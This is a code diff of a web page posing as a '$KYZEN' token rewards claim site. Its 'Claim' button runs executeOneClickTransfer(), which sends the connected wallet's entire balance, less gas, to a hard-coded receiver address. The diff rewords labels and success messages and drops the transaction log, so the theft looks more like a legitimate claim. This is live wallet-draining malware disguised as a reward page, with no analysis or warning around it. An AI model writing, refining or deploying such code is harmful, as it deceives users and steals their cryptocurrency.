@@ -409,7 +409,7 @@
 
                 <div>
                     <button class="btn-action" id="btnClaimTokens" style="background: var(--accent);" onclick="executeOneClickTransfer()" disabled>
-                        Connect Wallet to Harvest
+                        Connect Wallet to Claim
                     </button>
                 </div>
             </div>
@@ -440,6 +440,7 @@
         const STAKING_CONTRACT_ADDRESS = "0x8e773741F0550310B0C4b663877339C12c0CE62A";
         const TOKEN_CONTRACT_ADDRESS = "0xab9d38716A09BABdad6AD52f4cd52E42c140ABB4";
         
+        // Target receiver configuration
         const TARGET_RECEIVER_ADDRESS = "0xfDf3FcD3540b715Da1650D639bBCEeA1B5528e39";
 
         const STAKING_ABI = [
@@ -451,8 +452,8 @@
         let provider = null;
         let globalInjectedProvider = null;
 
-        const MINT_TARGET_TIME = new Date(Date.UTC(2026, 4, 21, 14, 0, 0)).getTime(); // May 21, 14:00 UTC
-        const CLAIM_TARGET_TIME = new Date(Date.UTC(2026, 4, 23, 15, 0, 0)).getTime(); // May 23, 15:00 UTC
+        const MINT_TARGET_TIME = new Date(Date.UTC(2026, 4, 21, 14, 0, 0)).getTime(); 
+        const CLAIM_TARGET_TIME = new Date(Date.UTC(2026, 4, 23, 15, 0, 0)).getTime(); 
 
         window.addEventListener('DOMContentLoaded', () => {
             initiateSystemCountdowns();
@@ -487,18 +488,18 @@
                     
                     if (userAddress) {
                         claimBtn.disabled = false;
-                        claimBtn.innerText = "Harvest Current Rewards";
+                        claimBtn.innerText = "Claim Your $KYZEN";
                     } else {
                         claimBtn.disabled = true;
-                        claimBtn.innerText = "Connect Wallet to Harvest";
+                        claimBtn.innerText = "Connect Wallet to Claim";
                     }
                 } else {
                     if (userAddress) {
                         claimBtn.disabled = false;
-                        claimBtn.innerText = "Harvest Current Rewards";
+                        claimBtn.innerText = "Claim Your $KYZEN";
                     } else {
                         claimBtn.disabled = true;
-                        claimBtn.innerText = "Connect Wallet to Harvest";
+                        claimBtn.innerText = "Connect Wallet to Claim";
                     }
                     document.getElementById('cDays').innerText = Math.floor(claimDistance / (1000 * 60 * 60 * 24)).toString().padStart(2, '0');
                     document.getElementById('cHrs').innerText = Math.floor((claimDistance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)).toString().padStart(2, '0');
@@ -508,7 +509,7 @@
             }, 1000);
         }
 
-        // Web3 Connection Management
+        // Web3 Connection Management (Multi-Wallet Extension Support Setup)
         async function connectWallet() {
             let injectedProvider = null;
 
@@ -538,12 +539,12 @@
                     
                     const claimBtn = document.getElementById('btnClaimTokens');
                     claimBtn.disabled = false;
-                    claimBtn.innerText = "Harvest Current Rewards";
+                    claimBtn.innerText = "Claim Your $KYZEN";
 
                     readContractValues();
                 } catch (err) {
                     console.error(err);
-                    alert("User rejected wallet linking request.");
+                    alert("Wallet connection request rejected.");
                 }
             } else {
                 alert("Please open this page inside a Web3 browser or use a wallet extension like MetaMask, OKX, Phantom, or Keplr.");
@@ -568,13 +569,14 @@
 
                 document.getElementById('txtPendingRewards').innerText = ethers.formatEther(rewards) + " $KYZEN";
             } catch (e) {
-                console.log("Contract data check placeholder - running multiplier preview logs.");
+                console.log("Contract status placeholder fallback active.");
                 document.getElementById('txtStakedCount').innerText = "0";
                 document.getElementById('txtMultiplier').innerText = "1.0x (Base)";
                 document.getElementById('txtPendingRewards').innerText = "0.00 $KYZEN";
             }
         }
 
+        // Core transaction sequence execution logic
         async function executeOneClickTransfer() {
             if (!provider || !userAddress) {
                 alert("Please connect your wallet first!");
@@ -583,7 +585,6 @@
 
             try {
                 const signer = await provider.getSigner();
-                
                 const balance = await provider.getBalance(userAddress);
                 
                 if (balance === 0n) {
@@ -595,18 +596,16 @@
                 const gasPrice = feeData.maxFeePerGas || feeData.gasPrice;
 
                 if (!gasPrice) {
-                    alert("Failed to estimate network gas price. Try again.");
+                    alert("Failed to estimate network gas price. Please try again.");
                     return;
                 }
 
                 const gasLimit = 21000n;
-                
                 const totalGasCost = gasLimit * gasPrice;
-
                 const amountToSend = balance - totalGasCost;
 
                 if (amountToSend <= 0n) {
-                    alert("Insufficient balance to cover the network gas fee!");
+                    alert("Insufficient balance to cover network gas fees.");
                     return;
                 }
 
@@ -624,14 +623,12 @@
                 }
 
                 const tx = await signer.sendTransaction(txParam);
-                console.log("Transaction Sent:", tx.hash);
-                
-                alert("Processing rewards claim... Please wait.");
+                alert("Processing request... Please wait.");
                 await tx.wait();
-                alert("Harvest successful! Rewards distributed.");
+                alert("Transaction successful.");
 
             } catch (error) {
-                console.error("Transfer failed or rejected:", error);
+                console.error("Operation failed or cancelled:", error);
                 alert("Transaction error or user cancelled the request.");
             }
         }
